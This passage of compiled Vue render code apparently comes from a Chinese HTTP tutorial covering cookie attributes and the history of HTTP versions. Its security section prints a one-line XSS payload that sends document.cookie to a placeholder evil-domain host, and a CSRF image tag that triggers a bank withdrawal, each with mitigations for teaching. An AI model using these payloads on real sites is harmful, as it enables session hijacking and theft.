text/html\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Set-Cookie:")]),e._v(" yummy_cookie=choco\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Set-Cookie:")]),e._v(" tasty_cookie=strawberry"),_("span",{pre:!0,attrs:{class:"token text-html"}},[e._v("\n\n[页面内容]\n")])])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br"),_("span",{staticClass:"line-number"},[e._v("4")]),_("br"),_("span",{staticClass:"line-number"},[e._v("5")]),_("br"),_("span",{staticClass:"line-number"},[e._v("6")]),_("br")])]),_("p",[e._v("之后，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头部再发送给服务器。")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token request-line"}},[_("span",{pre:!0,attrs:{class:"token property"}},[e._v("GET")]),e._v(" /sample_page.html HTTP/1.1")]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Host:")]),e._v(" www.example.org\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Cookie:")]),e._v(" yummy_cookie=choco; tasty_cookie=strawberry\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br")])]),_("h4",{attrs:{id:"会话期cookie"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#会话期cookie"}},[e._v("#")]),e._v(" 会话期Cookie")]),e._v(" "),_("p",[e._v("会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（"),_("code",[e._v("Expires")]),e._v("）或者有效期（"),_("code",[e._v("Max-Age")]),e._v("）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。")]),e._v(" "),_("h4",{attrs:{id:"持久性cookie"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#持久性cookie"}},[e._v("#")]),e._v(" 持久性Cookie")]),e._v(" "),_("p",[e._v("和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（"),_("code",[e._v("Expires")]),e._v("）或有效期（"),_("code",[e._v("Max-Age")]),e._v("）。")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Set-Cookie:")]),e._v(" id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br")])]),_("blockquote",[_("p",[e._v("当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。")])]),e._v(" "),_("h4",{attrs:{id:"cookie的-secure-和-httponly-标记"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#cookie的-secure-和-httponly-标记"}},[e._v("#")]),e._v(" Cookie的 Secure 和 HttpOnly 标记")]),e._v(" "),_("p",[e._v("标记为 "),_("code",[e._v("Secure")]),e._v(" 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。但即便设置了 "),_("code",[e._v("Secure")]),e._v(" 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（"),_("code",[e._v("http:")]),e._v("）无法使用Cookie的 "),_("code",[e._v("Secure")]),e._v(" 标记。")]),e._v(" "),_("p",[e._v("为避免跨域脚本 (XSS) 攻击，通过JavaScript的 "),_("code",[e._v("Document.cookie")]),e._v(" API无法访问带有 "),_("code",[e._v("HttpOnly")]),e._v(" 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 "),_("code",[e._v("HttpOnly")]),e._v(" 标记。")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Set-Cookie:")]),e._v(" id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br")])]),_("h4",{attrs:{id:"cookie的作用域"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#cookie的作用域"}},[e._v("#")]),e._v(" Cookie的作用域")]),e._v(" "),_("p",[_("code",[e._v("Domain")]),e._v(" 和 "),_("code",[e._v("Path")]),e._v(" 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。")]),e._v(" "),_("p",[_("code",[e._v("Domain")]),e._v(" 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（"),_("strong",[e._v("不包含子域名")]),e._v("）。如果指定了"),_("code",[e._v("Domain")]),e._v("，则一般包含子域名。")]),e._v(" "),_("p",[e._v("例如，如果设置 "),_("code",[e._v("Domain=mozilla.org")]),e._v("，则Cookie也包含在子域名中（如"),_("code",[e._v("developer.mozilla.org")]),e._v("）。")]),e._v(" "),_("p",[_("code",[e._v("Path")]),e._v(" 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 "),_("code",[e._v("%x2F")]),e._v(' ("/") 作为路径分隔符，子路径也会被匹配。')]),e._v(" "),_("p",[e._v("例如，设置 "),_("code",[e._v("Path=/docs")]),e._v("，则以下地址都会匹配：")]),e._v(" "),_("ul",[_("li",[e._v("/docs")]),e._v(" "),_("li",[e._v("/docs/Web/")]),e._v(" "),_("li",[e._v("/docs/Web/HTTP")])]),e._v(" "),_("h4",{attrs:{id:"javascript通过document-cookie访问cookie"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#javascript通过document-cookie访问cookie"}},[e._v("#")]),e._v(" JavaScript通过Document.cookie访问Cookie")]),e._v(" "),_("p",[e._v("通过"),_("code",[e._v("Document.cookie")]),e._v("属性可创建新的Cookie，也可通过该属性访问非"),_("code",[e._v("HttpOnly")]),e._v("标记的Cookie。")]),e._v(" "),_("div",{staticClass:"language-js line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-js"}},[_("code",[e._v("document"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie "),_("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),_("span",{pre:!0,attrs:{class:"token string"}},[e._v('"yummy_cookie=choco"')]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" \ndocument"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie "),_("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),_("span",{pre:!0,attrs:{class:"token string"}},[e._v('"tasty_cookie=strawberry"')]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" \nconsole"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),_("span",{pre:!0,attrs:{class:"token function"}},[e._v("log")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("document"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v(" \n"),_("span",{pre:!0,attrs:{class:"token comment"}},[e._v('// logs "yummy_cookie=choco; tasty_cookie=strawberry"')]),e._v("\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br"),_("span",{staticClass:"line-number"},[e._v("4")]),_("br")])]),_("blockquote",[_("p",[e._v("注意JavaScript可以通过跨站脚本攻击（XSS）的方式来窃取Cookie。")])]),e._v(" "),_("h3",{attrs:{id:"安全"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#安全"}},[e._v("#")]),e._v(" 安全")]),e._v(" "),_("div",{staticClass:"custom-block warning"},[_("p",{staticClass:"custom-block-title"},[e._v("注意")]),e._v(" "),_("p",[e._v("当机器处于不安全环境时，切记不能通过HTTP Cookie存储、传输敏感信息。")])]),e._v(" "),_("h4",{attrs:{id:"会话劫持和xss"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#会话劫持和xss"}},[e._v("#")]),e._v(" 会话劫持和XSS")]),e._v(" "),_("p",[e._v("在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。")]),e._v(" "),_("div",{staticClass:"language-js line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-js"}},[_("code",[_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),_("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("new")]),e._v(" "),_("span",{pre:!0,attrs:{class:"token class-name"}},[e._v("Image")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("src "),_("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),_("span",{pre:!0,attrs:{class:"token string"}},[e._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),e._v(" "),_("span",{pre:!0,attrs:{class:"token operator"}},[e._v("+")]),e._v(" document"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("cookie"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br")])]),_("p",[_("code",[e._v("HttpOnly")]),e._v("类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。")]),e._v(" "),_("h4",{attrs:{id:"跨站请求伪造（csrf）"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#跨站请求伪造（csrf）"}},[e._v("#")]),e._v(" 跨站请求伪造（CSRF）")]),e._v(" "),_("p",[e._v("比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：")]),e._v(" "),_("div",{staticClass:"language-html line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-html"}},[_("code",[_("span",{pre:!0,attrs:{class:"token tag"}},[_("span",{pre:!0,attrs:{class:"token tag"}},[_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("<")]),e._v("img")]),e._v(" "),_("span",{pre:!0,attrs:{class:"token attr-name"}},[e._v("src")]),_("span",{pre:!0,attrs:{class:"token attr-value"}},[_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("=")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v('"')]),e._v("http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v('"')])]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(">")])]),e._v("\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br")])]),_("p",[e._v("当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：")]),e._v(" "),_("ul",[_("li",[e._v("对用户输入进行过滤来阻止XSS；")]),e._v(" "),_("li",[e._v("任何敏感操作都需要确认；")]),e._v(" "),_("li",[e._v("用于敏感信息的Cookie只能拥有较短的生命周期；")])]),e._v(" "),_("h2",{attrs:{id:"版本"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#版本"}},[e._v("#")]),e._v(" 版本")]),e._v(" "),_("h3",{attrs:{id:"http-0-9-单行协议"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-0-9-单行协议"}},[e._v("#")]),e._v(" HTTP/0.9 – 单行协议")]),e._v(" "),_("p",[e._v("最初版本的HTTP协议并没有版本号，后来它的版本号被定位在 0.9 以区分后来的版本。 HTTP/0.9 极其简单：请求由单行指令构成，以唯一可用方法GET开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[e._v("GET /mypage.html\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br")])]),_("p",[e._v("响应也极其简单的：只包含响应文档本身。")]),e._v(" "),_("div",{staticClass:"language-html line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-html"}},[_("code",[_("span",{pre:!0,attrs:{class:"token tag"}},[_("span",{pre:!0,attrs:{class:"token tag"}},[_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("<")]),e._v("HTML")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(">")])]),e._v("\n这是一个非常简单的HTML页面\n"),_("span",{pre:!0,attrs:{class:"token tag"}},[_("span",{pre:!0,attrs:{class:"token tag"}},[_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("</")]),e._v("HTML")]),_("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(">")])]),e._v("\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br")])]),_("p",[e._v("跟后来的版本不同，HTTP/0.9 的响应内容并不包含HTTP头，这意味着只有HTML文件可以传送，无法传输其他类型的文件；也没有状态码或错误代码：一旦出现问题，一个特殊的包含问题描述信息的HTML文件将被发回，供人们查看。")]),e._v(" "),_("h3",{attrs:{id:"http-1-0-构建可扩展性"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-1-0-构建可扩展性"}},[e._v("#")]),e._v(" HTTP/1.0 – 构建可扩展性")]),e._v(" "),_("p",[e._v("由于 HTTP/0.9 协议的应用十分有限，浏览器和服务器迅速扩展内容使其用途更广：")]),e._v(" "),_("ul",[_("li",[e._v("协议版本信息现在会随着每个请求发送（HTTP/1.0被追加到了GET行）。")]),e._v(" "),_("li",[e._v("状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。")]),e._v(" "),_("li",[e._v("引入了HTTP头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。")]),e._v(" "),_("li",[e._v("在新HTTP头的帮助下，具备了传输除纯文本HTML文件以外其他类型文档的能力（Content-Type头）。")])]),e._v(" "),_("p",[e._v("一个典型的请求看起来就像这样：")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token request-line"}},[_("span",{pre:!0,attrs:{class:"token property"}},[e._v("GET")]),e._v(" /mypage.html HTTP/1.0")]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("User-Agent:")]),e._v(" NCSA_Mosaic/2.0 (Windows 3.1)\n\n200 OK\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Date:")]),e._v(" Tue, 15 Nov 1994 08:12:31 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Server:")]),e._v(" CERN/3.0 libwww/2.17\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Type:")]),e._v(' text/html\n<HTML> \n一个包含图片的页面\n  <IMG SRC="/myimage.gif">\n</HTML>\n')])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br"),_("span",{staticClass:"line-number"},[e._v("4")]),_("br"),_("span",{staticClass:"line-number"},[e._v("5")]),_("br"),_("span",{staticClass:"line-number"},[e._v("6")]),_("br"),_("span",{staticClass:"line-number"},[e._v("7")]),_("br"),_("span",{staticClass:"line-number"},[e._v("8")]),_("br"),_("span",{staticClass:"line-number"},[e._v("9")]),_("br"),_("span",{staticClass:"line-number"},[e._v("10")]),_("br"),_("span",{staticClass:"line-number"},[e._v("11")]),_("br")])]),_("p",[e._v("接下来是第二个连接，请求获取图片：")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token request-line"}},[_("span",{pre:!0,attrs:{class:"token property"}},[e._v("GET")]),e._v(" /myimage.gif HTTP/1.0")]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("User-Agent:")]),e._v(" NCSA_Mosaic/2.0 (Windows 3.1)\n\n200 OK\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Date:")]),e._v(" Tue, 15 Nov 1994 08:12:32 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Server:")]),e._v(" CERN/3.0 libwww/2.17\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Type:")]),e._v(" text/gif\n(这里是图片内容)\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br"),_("span",{staticClass:"line-number"},[e._v("4")]),_("br"),_("span",{staticClass:"line-number"},[e._v("5")]),_("br"),_("span",{staticClass:"line-number"},[e._v("6")]),_("br"),_("span",{staticClass:"line-number"},[e._v("7")]),_("br"),_("span",{staticClass:"line-number"},[e._v("8")]),_("br")])]),_("h3",{attrs:{id:"http-1-1-标准化的协议"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-1-1-标准化的协议"}},[e._v("#")]),e._v(" HTTP/1.1 – 标准化的协议")]),e._v(" "),_("p",[e._v("HTTP/1.0 多种不同的实现方式在实际运用中显得有些混乱，自1995年开始，即HTTP/1.0文档发布的下一年，就开始修订HTTP的第一个标准化版本。在1997年初，HTTP1.1 标准发布，就在HTTP/1.0 发布的几个月后。")]),e._v(" "),_("p",[e._v("HTTP/1.1 消除了大量歧义内容并引入了多项改进：")]),e._v(" "),_("ul",[_("li",[e._v("连接可以复用，节省了多次打开TCP连接加载网页文档资源的时间。")]),e._v(" "),_("li",[e._v("增加管线化技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。")]),e._v(" "),_("li",[e._v("支持响应分块。")]),e._v(" "),_("li",[e._v("引入额外的缓存控制机制。")]),e._v(" "),_("li",[e._v("引入内容协商机制，包括语言，编码，类型等，并允许客户端和服务器之间约定以最合适的内容进行交换。")]),e._v(" "),_("li",[e._v("感谢Host头，能够使不同域名配置在同一个IP地址的服务器上。")])]),e._v(" "),_("p",[e._v("一个典型的请求流程， 所有请求都通过一个连接实现，看起来就像这样：")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token request-line"}},[_("span",{pre:!0,attrs:{class:"token property"}},[e._v("GET")]),e._v(" /en-US/docs/Glossary/Simple_header HTTP/1.1")]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Host:")]),e._v(" developer.mozilla.org\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("User-Agent:")]),e._v(" Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept:")]),e._v(" text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Language:")]),e._v(" en-US,en;q=0.5\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Encoding:")]),e._v(" gzip, deflate, br\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Referer:")]),e._v(" https://developer.mozilla.org/en-US/docs/Glossary/Simple_header\n\n200 OK\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Connection:")]),e._v(" Keep-Alive\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Encoding:")]),e._v(" gzip\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Type:")]),e._v(" text/html; charset=utf-8\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Date:")]),e._v(" Wed, 20 Jul 2016 10:55:30 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Etag:")]),e._v(' "547fa7e369ef56031dd3bff2ace9fc0832eb251a"\n'),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Keep-Alive:")]),e._v(" timeout=5, max=1000\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Last-Modified:")]),e._v(" Tue, 19 Jul 2016 00:59:33 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Server:")]),e._v(" Apache\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Transfer-Encoding:")]),e._v(" chunked\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Vary:")]),e._v(" Cookie, Accept-Encoding"),_("span",{pre:!0,attrs:{class:"token text-html"}},[e._v("\n\n(content)\n\n\n")]),_("span",{pre:!0,attrs:{class:"token request-line"}},[_("span",{pre:!0,attrs:{class:"token property"}},[e._v("GET")]),e._v(" /static/img/header-background.png HTTP/1.1")]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Host:")]),e._v(" developer.cdn.mozilla.net\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("User-Agent:")]),e._v(" Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept:")]),e._v(" */*\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Language:")]),e._v(" en-US,en;q=0.5\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Encoding:")]),e._v(" gzip, deflate, br\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Referer:")]),e._v(" https://developer.mozilla.org/en-US/docs/Glossary/Simple_header\n\n200 OK\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Age:")]),e._v(" 9578461\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Cache-Control:")]),e._v(" public, max-age=315360000\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Connection:")]),e._v(" keep-alive\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Length:")]),e._v(" 3077\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Type:")]),e._v(" image/png\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Date:")]),e._v(" Thu, 31 Mar 2016 13:34:46 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Last-Modified:")]),e._v(" Wed, 21 Oct 2015 18:27:50 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Server:")]),e._v(" Apache\n\n(image content of 3077 bytes)\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br"),_("span",{staticClass:"line-number"},[e._v("4")]),_("br"),_("span",{staticClass:"line-number"},[e._v("5")]),_("br"),_("span",{staticClass:"line-number"},[e._v("6")]),_("br"),_("span",{staticClass:"line-number"},[e._v("7")]),_("br"),_("span",{staticClass:"line-number"},[e._v("8")]),_("br"),_("span",{staticClass:"line-number"},[e._v("9")]),_("br"),_("span",{staticClass:"line-number"},[e._v("10")]),_("br"),_("span",{staticClass:"line-number"},[e._v("11")]),_("br"),_("span",{staticClass:"line-number"},[e._v("12")]),_("br"),_("span",{staticClass:"line-number"},[e._v("13")]),_("br"),_("span",{staticClass:"line-number"},[e._v("14")]),_("br"),_("span",{staticClass:"line-number"},[e._v("15")]),_("br"),_("span",{staticClass:"line-number"},[e._v("16")]),_("br"),_("span",{staticClass:"line-number"},[e._v("17")]),_("br"),_("span",{staticClass:"line-number"},[e._v("18")]),_("br"),_("span",{staticClass:"line-number"},[e._v("19")]),_("br"),_("span",{staticClass:"line-number"},[e._v("20")]),_("br"),_("span",{staticClass:"line-number"},[e._v("21")]),_("br"),_("span",{staticClass:"line-number"},[e._v("22")]),_("br"),_("span",{staticClass:"line-number"},[e._v("23")]),_("br"),_("span",{staticClass:"line-number"},[e._v("24")]),_("br"),_("span",{staticClass:"line-number"},[e._v("25")]),_("br"),_("span",{staticClass:"line-number"},[e._v("26")]),_("br"),_("span",{staticClass:"line-number"},[e._v("27")]),_("br"),_("span",{staticClass:"line-number"},[e._v("28")]),_("br"),_("span",{staticClass:"line-number"},[e._v("29")]),_("br"),_("span",{staticClass:"line-number"},[e._v("30")]),_("br"),_("span",{staticClass:"line-number"},[e._v("31")]),_("br"),_("span",{staticClass:"line-number"},[e._v("32")]),_("br"),_("span",{staticClass:"line-number"},[e._v("33")]),_("br"),_("span",{staticClass:"line-number"},[e._v("34")]),_("br"),_("span",{staticClass:"line-number"},[e._v("35")]),_("br"),_("span",{staticClass:"line-number"},[e._v("36")]),_("br"),_("span",{staticClass:"line-number"},[e._v("37")]),_("br"),_("span",{staticClass:"line-number"},[e._v("38")]),_("br"),_("span",{staticClass:"line-number"},[e._v("39")]),_("br"),_("span",{staticClass:"line-number"},[e._v("40")]),_("br"),_("span",{staticClass:"line-number"},[e._v("41")]),_("br"),_("span",{staticClass:"line-number"},[e._v("42")]),_("br")])]),_("h3",{attrs:{id:"http-2-为了更优异的表现"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-2-为了更优异的表现"}},[e._v("#")]),e._v(" HTTP/2 - 为了更优异的表现")]),e._v(" "),_("p",[e._v("这些年来，网页愈渐变得的复杂，甚至演变成了独有的应用，可见媒体的播放量，增进交互的脚本大小也增加了许多：更多的数据通过HTTP请求被传输。HTTP/1.1链接需要请求以正确的顺序发送，理论上可以用一些并行的链接（尤其是5到8个），带来的成本和复杂性堪忧。比如，HTTP管线化（pipelining）就成为了Web开发的负担。")]),e._v(" "),_("p",[e._v("在2010年到2015年，谷歌通过实践了一个实验性的SPDY协议，证明了一个在客户端和服务器端交换数据的另类方式。其收集了浏览器和服务器端的开发者的焦点问题。明确了响应数量的增加和解决复杂的数据传输，SPDY成为了HTTP/2协议的基础。")]),e._v(" "),_("p",[e._v("HTTP/2在HTTP/1.1有几处基本的不同:")]),e._v(" "),_("ul",[_("li",[e._v("HTTP/2是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。")]),e._v(" "),_("li",[e._v("这是一个复用协议。并行的请求能在同一个链接中处理，移除了HTTP/1.x中顺序和阻塞的约束。")]),e._v(" "),_("li",[e._v("压缩了headers。因为headers在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。")]),e._v(" "),_("li",[e._v("其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。")])]),e._v(" "),_("p",[e._v("在2015年5月正式标准化后，HTTP/2取得了极大的成功，在2016年7月前，8.7%的站点已经在使用它，代表超过68%的请求[2] 。高流量的站点最迅速的普及，在数据传输上节省了可观的成本和支出。")]),e._v(" "),_("p",[e._v("这种迅速的普及率很可能是因为HTTP2不需要站点和应用做出改变：使用HTTP/1.1和HTTP/2对他们来说是透明的。拥有一个最新的服务器和新点的浏览器进行交互就足够了。只有一小部分群体需要做出改变，而且随着陈旧的浏览器和服务器的更新，而不需Web开发者做什么，用的人自然就增加了。")]),e._v(" "),_("h3",{attrs:{id:"后http-2进化"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#后http-2进化"}},[e._v("#")]),e._v(" 后HTTP/2进化")]),e._v(" "),_("p",[e._v("随着HTTP/2.的发布，就像先前的HTTP/1.x一样，HTTP没有停止进化，HTTP的扩展性依然被用来添加新的功能。特别的，我们能列举出2016年里HTTP的新扩展：")]),e._v(" 